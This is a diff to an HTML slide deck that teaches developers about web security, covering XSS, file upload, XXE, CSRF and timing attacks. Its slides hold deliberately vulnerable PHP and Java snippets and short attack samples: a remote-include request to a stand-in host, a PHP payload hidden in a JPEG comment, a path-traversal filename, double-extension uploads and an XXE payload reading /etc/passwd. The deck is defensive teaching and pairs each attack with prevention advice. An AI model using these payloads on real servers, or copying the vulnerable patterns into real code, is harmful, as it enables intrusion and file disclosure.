@@ -743,22 +743,26 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
   </div>
   <div class="slide hidden" id="slide-22">
     <section class="slide-content"><h3 id="lesser-known-xss-vulnerabilities">Lesser Known XSS Vulnerabilities</h3>
-<p><strong>href</strong>, <strong>src</strong>, <strong>style</strong> and <strong>&lt;style&gt;</strong> allow javascript:alert(&#39;hi&#39;)</p>
+<p><strong>href</strong>, <strong>src</strong>, <strong>style</strong> and <strong>&lt;style&gt;</strong> allow javascript:alert(&#39;hi&#39;)
+<strong>SVG</strong> allows JavaScript</p>
 <pre><code class="lang-php">&lt;a href=<span class="string">"&lt;?php echo $accountId&gt;"</span>&gt;link&lt;/a&gt;</code></pre>
 <pre><code class="lang-php">&lt;a href=<span class="string">"/?value=&lt;?php echo $accountId&gt;"</span>&gt;link&lt;/a&gt;</code></pre>
 <pre><code class="lang-php">&lt;!-- <span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$comment</span> <span class="preprocessor">?&gt;</span> --&gt;</code></pre>
 <pre><code class="lang-php">&lt;img src=<span class="string">"&lt;?php echo $accountId&gt;"</span>/&gt;</code></pre>
 <pre><code class="lang-php">&lt;img style=<span class="string">"&lt;?php echo $accountId&gt;"</span>/&gt;</code></pre>
+<pre><code class="lang-xml"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"uploaded.svg"</span>&gt;</span></code></pre>
 <pre><code class="lang-php">&lt;style&gt;<span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$accountId</span>&gt;&lt;/style&gt;</code></pre>
 <pre><code class="lang-javascript">$(<span class="string">'&lt;a&gt;'</span>).html(response);  <span class="comment">// use text() instead</span></code></pre>
-<p><strong>Content-Type: text/html; charset=utf-8</strong> for JSON responses</p>
 </section>
   </div>
   <div class="slide hidden" id="slide-23">
     <section class="slide-content"><h3 id="xss-prevention">XSS Prevention</h3>
 <ul>
+<li><strong>Content-Type: application/json; charset=utf-8</strong> for JSON responses</li>
+<li>Have I mentioned SVG? If needed consider serving from a different domain</li>
+<li>If user supplied HTML is needed, use a whitelist xml parser (why? Did you test for injecting AngularJS directives :D?)</li>
 <li>Escape based on usage</li>
-<li>Validate URIs for <strong>src</strong> and <strong>href</strong></li>
+<li>Whitelist URIs for <strong>src</strong> and <strong>href</strong> (Why? Because &lt;img src=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt; and tons of other ways)</li>
 <li>Do not use dynamic CSS style sheets</li>
 <li><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#XSS_Prevention_Rules_Summary">Consult the prevention sheet</a>, too much possibilities</li>
 <li>Use <a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP">CSP</a></li>
@@ -779,6 +783,7 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
   </div>
   <div class="slide hidden" id="slide-25">
     <section class="slide-content"><h3 id="file-upload-vulnerability">File Upload Vulnerability</h3>
+<p>Facepalm ahead</p>
 <pre><code class="lang-php"><span class="keyword">if</span>(preg_match(<span class="string">'~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i'</span>, <span class="variable">$filename</span>)) {
     <span class="keyword">require</span>(<span class="variable">$filename</span>);
 }</code></pre>
@@ -795,14 +800,27 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
   </div>
   <div class="slide hidden" id="slide-26">
     <section class="slide-content"><h3 id="file-upload-attack">File Upload Attack</h3>
-<pre><code class="lang-php"><span class="keyword">if</span>(preg_match(<span class="string">'~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i'</span>, <span class="variable">$filename</span>)) {
+<pre><code class="lang-php"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>] <span class="string">'.php'</span>);</code></pre>
+<pre><code>GET /?id=myuploaded.php
+GET /?id=http://myserver/evil</code></pre>
+<pre><code class="lang-php"><span class="keyword">if</span> (@getimagesize(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]) !== <span class="keyword">false</span>) {
+    <span class="variable">$destination</span> = <span class="string">"uploads/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
+    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$destination</span>);  <span class="comment">// see next slide</span>
+}
+<span class="keyword">if</span>(preg_match(<span class="string">'~^[a-z_\.0-9]+\.(jp[e]?g|png|gif)$~i'</span>, <span class="variable">$filename</span>)) {
     <span class="keyword">require</span>(<span class="variable">$filename</span>);
 }</code></pre>
-<p>Upload an image which embeds php tags (&lt;?php ?&gt;)</p>
+<p>Embed comment in jpeg (Parser stops before parsing garbage image data)</p>
+<pre><code class="lang-php"><span class="preprocessor">&lt;?php</span> do_something_evil(); __halt_compiler();<span class="comment"></code></pre>
+</section>
+  </div>
+  <div class="slide hidden" id="slide-27">
+    <section class="slide-content"><h3 id="file-upload-attack-2">File Upload Attack 2</h3>
 <pre><code class="lang-php"><span class="keyword">if</span> (in_array(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>], [<span class="string">"image/gif"</span>, <span class="string">"image/png"</span>])) {
     <span class="variable">$destination</span> = <span class="string">"uploads/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
     move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$destination</span>);
 }</code></pre>
+<p>Two ways (and they can be combined \o/):</p>
 <pre><code class="lang-http"><span class="attribute">Content-Type</span>: <span class="string">multipart/form-data; boundary=----ThisIsABoundary</span>
 
 <span class="brainfuck"> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">ThisIsABoundary</span>
@@ -811,25 +829,25 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 
 &lt;<span class="comment">?php</span> <span class="comment">phpinfo();</span>
  <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">ThisIsABoundary</span>-<span class="literal">-</span></span></code></pre>
-<pre><code class="lang-php"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">'id'</span>] <span class="string">'.php'</span>);</code></pre>
-<pre><code>GET /?id=myuploaded.php</code></pre>
-</section>
-  </div>
-  <div class="slide hidden" id="slide-27">
-    <section class="slide-content"><h3 id="file-upload-attack-2">File Upload Attack 2</h3>
-<pre><code class="lang-php"><span class="keyword">if</span> (@getimagesize(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]) !== <span class="keyword">false</span>) {
-    <span class="variable">$destination</span> = <span class="string">"uploads/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
-    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="variable">$destination</span>);
-}</code></pre>
-<p>Embed comment in jpeg</p>
-<pre><code class="lang-php"><span class="preprocessor">&lt;?php</span> do_something_evil(); __halt_compiler();<span class="comment"></code></pre>
-<p>Parser stops before parsing garbage image data</p>
+<p>Filename: ../../unsafe/directory/myfile.php</p>
 </section>
   </div>
   <div class="slide hidden" id="slide-28">
+    <section class="slide-content"><h3 id="file-upload-attack-3">File Upload Attack 3</h3>
+<p>Apache feature: <a href="https://www.acunetix.com/websitesecurity/upload-forms-threat/">Double Extensions</a> ❀(<em>´◡`</em>)❀</p>
+<blockquote>
+<p>Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. If more than one extension is given which maps onto the same type of meta-information, then the one to the right will be used, except for languages and content encodings. For example, if .gif maps to the MIME-type image/gif and .html maps to the MIME-type text/html, then the file welcome.gif.html will be associated with the MIME-type text/html.</p>
+</blockquote>
+<p>If we don&#39;t specify 123 as mime-type, <strong>file.php.123</strong> will be executed as PHP m/</p>
+</section>
+  </div>
+  <div class="slide hidden" id="slide-29">
     <section class="slide-content"><h3 id="file-upload-prevention">File Upload Prevention</h3>
 <ul>
-<li>Do not execute anything from the upload directory</li>
+<li>Generate filename, <strong>NEVER, EVER</strong> use user supplied mime types or names (<strong>$_FILES[‘uploadedfile’][‘name’]:</strong>, <strong>$_FILES[‘uploadedfile’][‘type’]</strong>)</li>
+<li>NodeJS same issue</li>
+<li>Do not execute anything from the upload directory (no include, require)</li>
+<li>Use a dumb file upload server (nginx) + research configs</li>
 <li>Do not require/include anything from the upload directory</li>
 <li>Disallow special files (.htaccess, <a href="http://php.net/manual/en/configuration.file.per-user.php">.user.ini</a>, web.config, robots.txt, crossdomain.xml, clientaccesspolicy.xml) and turn off .htaccess parsing</li>
 <li>Remove executable bits from uploads (644)</li>
@@ -840,21 +858,44 @@ response.setHeader(<span class="string">'X-Frame-Options'</span>, <span class="s
 </ul>
 </section>
   </div>
-  <div class="slide hidden" id="slide-29">
-    <section class="slide-content"><h3 id="xxe">XXE</h3>
+  <div class="slide hidden" id="slide-30">
+    <section class="slide-content"><h3 id="xxe-vulnerability">XXE Vulnerability</h3>
+<p><strong>Java</strong>:</p>
+<pre><code class="lang-java">DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
+DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
+Document doc = dBuilder.parse(userSuppliedXml);</code></pre>
+<p><strong>PHP:</strong></p>
+<pre><code class="lang-php"><span class="variable">$dom</span> = <span class="keyword">new</span> DomDocument(<span class="variable">$userSuppliedXml</span>);
+<span class="keyword">echo</span> <span class="variable">$dom</span>-&gt;saveXml();</code></pre>
+</section>
+  </div>
+  <div class="slide hidden" id="slide-31">
+    <section class="slide-content"><h3 id="xxe-attack">XXE Attack</h3>
 <pre><code class="lang-xml"><span class="pi">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
 <span class="doctype">&lt;!DOCTYPE foo [  
  &lt;!ELEMENT foo ANY &gt;
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span><span class="tag">&lt;<span class="title">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="title">foo</span>&gt;</span></code></pre>
+</section>
+  </div>
+  <div class="slide hidden" id="slide-32">
+    <section class="slide-content"><h3 id="xxe-prevention">XXE Prevention</h3>
 <ul>
 <li>Disable XML External Entity Processing!</li>
 </ul>
+<p><strong>Java</strong>:</p>
 <pre><code class="lang-java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
 FEATURE = <span class="string">"http://xml.org/sax/features/external-general-entities"</span>;
 dbf.setFeature(FEATURE, <span class="keyword">false</span>);</code></pre>
+<p><strong>PHP</strong>:</p>
+<pre><code class="lang-php"><span class="variable">$default</span> = libxml_disable_entity_loader(<span class="keyword">true</span>);
+<span class="variable">$dom</span> = <span class="keyword">new</span> DomDocument(<span class="variable">$userSuppliedXml</span>);
+libxml_disable_entity_loader(<span class="keyword">false</span>);
+
+<span class="keyword">echo</span> <span class="variable">$dom</span>-&gt;saveXml();</code></pre>
+<p><strong>libxml_disable_entity_loader</strong> not threadsafe on php-fpm, use <a href="https://github.com/zendframework/ZendXml">ZendXML</a></p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-30">
+  <div class="slide hidden" id="slide-33">
     <section class="slide-content"><h3 id="csrf">CSRF</h3>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/delete-user"</span>)
 <span class="keyword">public</span> <span class="keyword">void</span> deleteUser(<span class="annotation">@RequestParam</span>(<span class="string">"user"</span>) String user) {
@@ -873,7 +914,7 @@ dbf.setFeature(FEATURE, <span class="keyword">false</span>);</code></pre>
 <p>Beware of CORS with credentials enabled!</p>
 </section>
   </div>
-  <div class="slide hidden" id="slide-31">
+  <div class="slide hidden" id="slide-34">
     <section class="slide-content"><h3 id="timing-attacks">Timing Attacks</h3>
 <pre><code class="lang-java"><span class="annotation">@RequestMapping</span>(<span class="string">"/authenticate"</span>)
 <span class="keyword">public</span> <span class="keyword">void</span> resetPasswordEmail(<span class="annotation">@RequestParam</span>(<span class="string">"user"</span>) String user, <span class="annotation">@RequestParam</span>(<span class="string">"pass"</span>) String pass) {
@@ -889,7 +930,7 @@ dbf.setFeature(FEATURE, <span class="keyword">false</span>);</code></pre>
 }</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-32">
+  <div class="slide hidden" id="slide-35">
     <section class="slide-content"><h3 id="password-hashing">Password Hashing</h3>
 <pre><code class="lang-java">String password = <span class="string">"mypass"</span>;
 String hashedPassword = hash(password);</code></pre>
@@ -902,7 +943,7 @@ String salt = BCrypt.gensalt();  <span class="comment">// saved in database with
 String hashedPassword = BCrypt.hashpw(password, global_salt + salt);</code></pre>
 </section>
   </div>
-  <div class="slide hidden" id="slide-33">
+  <div class="slide hidden" id="slide-36">
     <section class="slide-content"><h3 id="resources">Resources</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/Top_10_2013-Top_10">OWASP Top 10</a></li>
